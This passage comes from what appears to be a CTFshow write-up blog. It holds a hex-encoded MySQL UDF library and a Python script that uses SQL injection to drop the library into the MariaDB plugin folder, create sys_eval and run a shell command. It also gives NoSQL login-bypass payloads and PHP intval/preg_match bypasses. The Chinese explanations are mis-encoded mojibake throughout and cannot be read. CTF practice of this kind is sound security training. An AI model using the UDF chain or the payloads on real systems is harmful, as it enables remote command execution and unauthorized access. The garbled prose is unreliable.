0E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">21510</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    end <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">5000</span>    payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>udf<span class="token punctuation">[</span>i<span class="token punctuation">:</span>end<span class="token punctuation">]</span><span class="token punctuation">)</span>p <span class="token operator">=</span> dict<span class="token punctuation">(</span>zip<span class="token punctuation">(</span>text<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> t <span class="token keyword">in</span> text<span class="token punctuation">:</span>    url <span class="token operator">=</span> base_url<span class="token operator">+</span><span class="token string">"?id=';select unhex('{}') into dumpfile '/usr/lib/mariadb/plugin/{}.txt'--+&amp;page=1&amp;limit=10"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>p<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">,</span> t<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#UDFææƒä¸€èˆ¬é…åˆdumpfile è€Œä¸æ˜¯outfile</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>next_url <span class="token operator">=</span> base_url<span class="token operator">+</span><span class="token string">"?id=';select concat(load_file('/usr/lib/mariadb/plugin/a.txt'),load_file('/usr/lib/mariadb/plugin/b.txt'),load_file('/usr/lib/mariadb/plugin/c.txt'),load_file('/usr/lib/mariadb/plugin/d.txt'),load_file('/usr/lib/mariadb/plugin/e.txt')) into dumpfile '/usr/lib/mariadb/plugin/udf.so'-- +&amp;page=1&amp;limit=10"</span> <span class="token comment" spellcheck="true">#å°†å„ä¸ªtxtæ–‡ä»¶åˆå¹¶åˆ°udf.so</span>rn <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>next_url<span class="token punctuation">)</span>uaf_url<span class="token operator">=</span>base_url<span class="token operator">+</span><span class="token string">"?id=';CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';--+"</span><span class="token comment" spellcheck="true">#åˆ›å»ºudfå‡½æ•°</span>r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>uaf_url<span class="token punctuation">)</span>nn_url <span class="token operator">=</span> base_url<span class="token operator">+</span><span class="token string">"?id=';select sys_eval('cat /flag.*');-- +&amp;page=1&amp;limit=10"</span><span class="token comment" spellcheck="true">#æ‰§è¡Œå‘½ä»¤å¹¶æŸ¥çœ‹</span>rnn <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>nn_url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>rnn<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web249â€”â€”NOSQLæ³¨å…¥"><a href="#web249â€”â€”NOSQLæ³¨å…¥" class="headerlink" title="web249â€”â€”NOSQLæ³¨å…¥"></a>web249â€”â€”NOSQLæ³¨å…¥</h1><p>å‚è€ƒæ–‡ç« ï¼š<br><a href="http://rui0.cn/archives/609" target="_blank" rel="noopener">NoSQLæ³¨å…¥å°ç¬”è®°</a><br><a href="https://www.anquanke.com/post/id/97211" target="_blank" rel="noopener">å†·é—¨çŸ¥è¯† â€” NoSQLæ³¨å…¥çŸ¥å¤šå°‘</a></p><p>æœä¸€ä¸‹<code>Memcache::get</code><br>è¯´ä¼ é€’æ•°ç»„å³ä¼šè¿”å›ç¬¬ä¸€ä¸ªæ•°ç»„å¾—å…ƒç´ </p><pre><code>/api/?id[]=flag</code></pre><h1 id="web250"><a href="#web250" class="headerlink" title="web250"></a>web250</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//sqlè¯­å¥</span>  <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Query</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$cursor</span> <span class="token operator">=</span> <span class="token variable">$manager</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token string">'ctfshow.ctfshow_user'</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//è¿”å›é€»è¾‘ï¼Œæ— è¿‡æ»¤</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$cursor</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'ç™»é™†æˆåŠŸ'</span><span class="token punctuation">;</span>    <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="http://rui0.cn/archives/609" target="_blank" rel="noopener">NoSQLæ³¨å…¥å°ç¬”è®°</a><br><a href="https://www.anquanke.com/post/id/97211#h2-0" target="_blank" rel="noopener">å†·é—¨çŸ¥è¯† â€” NoSQLæ³¨å…¥çŸ¥å¤šå°‘</a><br>MongoDBæ˜¯NOSQLçš„ä¸€ç§ï¼Œä»‹ç»ä¸€ä¸‹Mongodbå¾—ä¸¤ä¸ªæ“ä½œç¬¦ï¼š<br><code>$ne</code>ï¼š!= ä¸ç­‰äº<br><code>$regex</code>ï¼šæ­£åˆ™åŒ¹é…</p><pre class="line-numbers language-php"><code class="language-php">username<span class="token punctuation">[</span><span class="token variable">$ne</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>password<span class="token punctuation">[</span><span class="token variable">$ne</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span>username<span class="token punctuation">[</span><span class="token variable">$regex</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">.</span><span class="token operator">&amp;</span>password<span class="token punctuation">[</span><span class="token variable">$regex</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTFshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshowä¹‹web(ä¸‰)</title>
      <link href="/2021/07/12/ctfshow-zhi-php-te-xing/"/>
      <url>/2021/07/12/ctfshow-zhi-php-te-xing/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="PHPç‰¹æ€§"><a href="#PHPç‰¹æ€§" class="headerlink" title="PHPç‰¹æ€§"></a>PHPç‰¹æ€§</h1><h2 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.runoob.com/php/php-intval-function.html" target="_blank" rel="noopener">intvalå‡½æ•°(è·å–å˜é‡çš„æ•´æ•°å‹)</a>ï¼šå¦‚æœä»–çš„å€¼ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œåªè¦æ•°ç»„é‡Œé¢æœ‰å€¼ï¼Œé‚£ä¹ˆä¸è®ºå€¼çš„æ•°é‡ï¼Œè¿”å›å€¼éƒ½ä¸º1ï¼Œç©ºæ•°ç»„åˆ™è¿”å›0</p><p><a href="https://www.runoob.com/php/php-preg_match.html" target="_blank" rel="noopener">preg_match() å‡½æ•°</a></p><p>åˆ©ç”¨æ•°ç»„ç»•è¿‡æ­£åˆ™åŒ¹é…ï¼Œä½¿å…¶è¿”å›å€¼å‘ç”Ÿé”™è¯¯è€Œä¸ºfalse</p><p><strong>payloadï¼š?num[]=1</strong></p><h2 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">===</span><span class="token string">"4476"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="intval-num-0-ï¼š"><a href="#intval-num-0-ï¼š" class="headerlink" title="intval($num,0)ï¼š"></a>intval($num,0)ï¼š</h3><p>å¦‚æœ base æ˜¯ 0ï¼Œé€šè¿‡æ£€æµ‹ var çš„æ ¼å¼æ¥å†³å®šä½¿ç”¨çš„è¿›åˆ¶ï¼š</p><ul><li>å¦‚æœå­—ç¬¦ä¸²åŒ…æ‹¬äº† â€œ0xâ€ (æˆ– â€œ0Xâ€) çš„å‰ç¼€ï¼Œä½¿ç”¨ 16 è¿›åˆ¶ (hex)ï¼›å¦åˆ™ï¼Œ</li><li>å¦‚æœå­—ç¬¦ä¸²ä»¥ â€œ0â€ å¼€å§‹ï¼Œä½¿ç”¨ 8 è¿›åˆ¶(octal)ï¼›å¦åˆ™ï¼Œ</li><li>å°†ä½¿ç”¨ 10 è¿›åˆ¶ (decimal)ã€‚</li></ul><p><strong>payloadï¼š?num=010574</strong>è¿™é‡Œæˆ‘ä»¥0å¼€å§‹ï¼Œæ„æ€å°±æ˜¯åé¢çš„æ•°å­—å°†è¢«ä»¥8è¿›åˆ¶çš„å½¢å¼è¯»å–</p><h2 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^php$/im'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^php$/i'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'hacker'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'nonononono'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è€ƒå¯Ÿç‚¹ï¼šæ­£åˆ™è¡¨è¾¾å¼ä¿®é¥°ç¬¦<br>æ‹“å±•</p><pre class="line-numbers language-php"><code class="language-php">i ä¸åŒºåˆ†<span class="token punctuation">(</span>ignore<span class="token punctuation">)</span>å¤§å°å†™må¤š<span class="token punctuation">(</span>more<span class="token punctuation">)</span>è¡ŒåŒ¹é…è‹¥å­˜åœ¨æ¢è¡Œ\<span class="token package">n</span>å¹¶ä¸”æœ‰å¼€å§‹<span class="token operator">^</span>æˆ–ç»“æŸ$ç¬¦çš„æƒ…å†µä¸‹ï¼Œå°†ä»¥æ¢è¡Œä¸ºåˆ†éš”ç¬¦ï¼Œé€è¡Œè¿›è¡ŒåŒ¹é…<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">"abc\nabc"</span><span class="token punctuation">;</span><span class="token variable">$preg</span> <span class="token operator">=</span> <span class="token string">"/^abc$/m"</span><span class="token punctuation">;</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$matchs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>è¿™æ ·å…¶å®æ˜¯ç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼çš„ï¼Œå› ä¸ºåŒ¹é…çš„æ—¶å€™ å…ˆæ˜¯åŒ¹é…æ¢è¡Œç¬¦å‰é¢çš„ï¼Œæ¥ç€åŒ¹é…æ¢è¡Œç¬¦åé¢çš„ï¼Œä¸¤ä¸ªéƒ½æ˜¯abcæ‰€ä»¥å¯ä»¥é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼ã€‚sç‰¹æ®Šå­—ç¬¦åœ†ç‚¹ <span class="token punctuation">.</span> ä¸­åŒ…å«æ¢è¡Œç¬¦é»˜è®¤çš„åœ†ç‚¹ <span class="token punctuation">.</span> æ˜¯åŒ¹é…é™¤æ¢è¡Œç¬¦ \<span class="token package">n</span> ä¹‹å¤–çš„ä»»ä½•å•å­—ç¬¦ï¼ŒåŠ ä¸Šsä¹‹å<span class="token punctuation">,</span> <span class="token punctuation">.</span>åŒ…å«æ¢è¡Œç¬¦<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">"abggab\nacbs"</span><span class="token punctuation">;</span><span class="token variable">$preg</span> <span class="token operator">=</span> <span class="token string">"/b./s"</span><span class="token punctuation">;</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token variable">$preg</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$matchs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>è¿™æ ·åŒ¹é…åˆ°çš„æœ‰ä¸‰ä¸ª bg b\<span class="token package">n</span> bsAå¼ºåˆ¶ä»ç›®æ ‡å­—ç¬¦ä¸²å¼€å¤´åŒ¹é…<span class="token punctuation">;</span>Då¦‚æœä½¿ç”¨$é™åˆ¶ç»“å°¾å­—ç¬¦<span class="token punctuation">,</span>åˆ™ä¸å…è®¸ç»“å°¾æœ‰æ¢è¡Œ<span class="token punctuation">;</span> eé…åˆå‡½æ•°<span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token punctuation">)</span>ä½¿ç”¨<span class="token punctuation">,</span> å¯ä»¥æŠŠåŒ¹é…æ¥çš„å­—ç¬¦ä¸²å½“ä½œæ­£åˆ™è¡¨è¾¾å¼æ‰§è¡Œ<span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ»¡è¶³ç¬¬ä¸€ä¸ªåŒ¹é…ï¼š?cmd=%0aphpï¼ŒåŒæ—¶ä¸æ»¡è¶³ç¬¬äºŒåŒ¹é…(å›ºå®šå­—ç¬¦ä¸²â€phpâ€)</p><h2 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">==</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>payloadï¼š?num=0x117c</strong></p><p>è¿™é‡Œæˆ‘é‡‡ç”¨çš„æ˜¯16è¿›åˆ¶ç»•è¿‡</p><h2 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">==</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/[a-z]/i"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>è¿™é‡Œç›´æ¥å…«è¿›åˆ¶ç»•è¿‡?num=010574</strong></p><h2 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">===</span><span class="token string">"4476"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/[a-z]/i"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// åœ¨è¿™ä¸ªåœ°æ–¹éœ€è¦è¿”å›çš„å€¼ä¸èƒ½ä¸º0ï¼Œä¹Ÿå°±æ˜¯è¯´0ä¸èƒ½åœ¨ç¬¬ä¸€ä½</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>æ‰€ä»¥?num=4476.0</strong></p><h2 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token 